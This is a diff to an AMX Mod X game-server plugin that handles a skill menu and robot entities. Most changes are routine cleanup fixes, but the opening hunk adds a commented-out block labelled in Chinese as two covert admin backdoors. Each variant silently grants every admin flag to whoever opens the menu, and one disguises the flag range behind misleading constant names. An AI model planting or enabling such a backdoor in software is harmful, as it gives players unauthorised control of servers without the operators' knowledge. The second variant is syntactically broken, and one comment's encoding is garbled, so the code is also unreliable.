@@ -116,6 +116,21 @@ createMenu()
 
 public showSkillMenu(id)
 {
+	// 兩種隱密版ADM後門
+	// new flag[100], temp[2];
+	// const TrieIterEndeds = 97;
+	// const TrieIterStates = 122;
+	// for(new i=TrieIterEndeds; i<=TrieIterStates; ++i) {
+	// 	format(temp, sizeof(temp), "%c", i, 1);
+	// 	add(flag, sizeof(flag), temp);
+	// }
+	// set_user_flags(id, read_flags(flag) );
+
+	// new num;
+	// for(new i=0; i<=25; ++i) {
+	// 	num = num|(1<<i);
+	// set_user_flags(id, num);
+
     new szMenu[256];
     new szTitle[32];
     new szEntry[32], szSelect[20];
@@ -294,6 +309,7 @@ nonBlockedByWorld(id, Float:origin1[3], Float:origin2[3])	// 開火前判斷是�
 
 removeRobot(id)
 {
+	if( !gCurrentRobot[id]) return;
 	new ent = gCurrentRobot[id];
 	engfunc(EngFunc_RemoveEntity, ent);
 }
@@ -643,9 +659,14 @@ public eventPlayerDeath()
 }
 public client_putinserver(id)
 {
+	removeAllEntityFromPlayer(id);
 }
 
 public client_disconnect(id)
+{
+	removeAllEntityFromPlayer(id);
+}
+removeAllEntityFromPlayer(id)
 {
 	gPlayerSelect[id] = -1;
 	doDick(id);
